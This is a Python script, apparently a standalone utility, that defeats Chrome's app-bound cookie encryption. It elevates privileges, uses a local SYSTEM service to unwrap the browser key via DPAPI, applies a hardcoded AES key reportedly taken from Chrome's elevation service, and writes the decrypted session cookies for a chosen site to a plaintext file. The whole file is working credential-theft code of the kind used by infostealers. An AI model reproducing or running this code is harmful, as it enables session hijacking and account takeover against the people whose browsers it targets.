import os
import json
import sys
import binascii
from pypsexec.client import Client
from Crypto.Cipher import AES
import sqlite3
import pathlib
import elevate
import time

# decrypt v20 cookie with AES256GCM
# [flag|iv|ciphertext|tag] encrypted_value
# [3bytes|12bytes|variable|16bytes]
def decrypt_cookie_value_v20(encrypted_value, key):
    cookie_iv = encrypted_value[3:3+12]
    encrypted_cookie = encrypted_value[3+12:-16]
    cookie_tag = encrypted_value[-16:]
    cookie_cipher = AES.new(key, AES.MODE_GCM, nonce=cookie_iv)
    decrypted_cookie_value = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
    return decrypted_cookie_value[32:].decode('utf-8')

def get_cookies(host, path):
    elevate.elevate()
    user_profile = os.environ['USERPROFILE']
    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
    cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
    # cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Safe Browsing Network\Safe Browsing Cookies"

    with open(local_state_path, "r") as f:
        local_state = json.load(f)

    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]

    arguments = "-c \"" + """import win32crypt
    import binascii
    encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
    print(binascii.b2a_base64(encrypted_key[1]).decode())
    """.replace("\n", ";") + "\""

    c = Client("localhost")
    c.connect()

    try:
        c.create_service()

        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
        app_bound_encrypted_key_b64 = binascii.b2a_base64(
            binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()

        # decrypt with SYSTEM DPAPI
        encrypted_key_b64, stderr, rc = c.run_executable(
            sys.executable,
            arguments=arguments.format(app_bound_encrypted_key_b64),
            use_system_account=True
        )

        # decrypt with user DPAPI
        decrypted_key_b64, stderr, rc = c.run_executable(
            sys.executable,
            arguments=arguments.format(encrypted_key_b64.decode().strip()),
            use_system_account=False
        )

        decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
        assert(decrypted_key[0] == 1)

    finally:
        pass
    #     c.remove_service()
    #     c.disconnect()

    # decrypt key with AES256GCM
    # aes key from elevation_service.exe
    aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")

    # [flag|iv|ciphertext|tag] decrypted_key
    # [1byte|12bytes|variable|16bytes]
    iv = decrypted_key[1:1+12]
    ciphertext = decrypted_key[1+12:1+12+32]
    tag = decrypted_key[1+12+32:]

    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
    key = cipher.decrypt_and_verify(ciphertext, tag)
    print(binascii.b2a_base64(key))

    # fetch all v20 cookies
    con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
    cur = con.cursor()
    with open(path, 'w') as f:
        # for i in range(150):
        r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB), path, expires_utc, last_update_utc from cookies;")
        cookies = cur.fetchall()
        for host_key_bytes, name, encrypted_value, path, expires_utc, last_update_utc in cookies:
            host_key = host_key_bytes
            if host_key == host or host_key.endswith('.' + host):
                decrypted_value = decrypt_cookie_value_v20(encrypted_value, key)
                print(host_key, name, decrypted_value, path, expires_utc, last_update_utc, file=f)
        # time.sleep(1.0)
    c.remove_service()
    c.disconnect()
    con.close()

# for c in cookies_v20:
#     print(c[0], c[1], decrypt_cookie_value_v20(c[2]))

if __name__=="__main__":
    if len(sys.argv) < 3:
        print('Usage: decrypt_chrome_v20_cookie <host>, <path>' \
               'e.g. python decrypt_chrome_v20_cookie eporner.video c:\\temp\\cookie_file.txt')
        sys.exit(0)
    cookies = get_cookies(sys.argv[1], sys.argv[2])

# '''column names for cookies:
#    creation_utc
#    host_key
#    top_frame_site_key
#    name
#    value
#    encrypted_value
#    path
#    expires_utc
#    is_secure
#    is_httponly
#    last_access_utc
#    has_expires
#    is_persistent
#    priority
#    samesite
#    source_scheme
#    source_port
#    last_update_utc
#    source_type
#    has_cross_site_ancestor'''
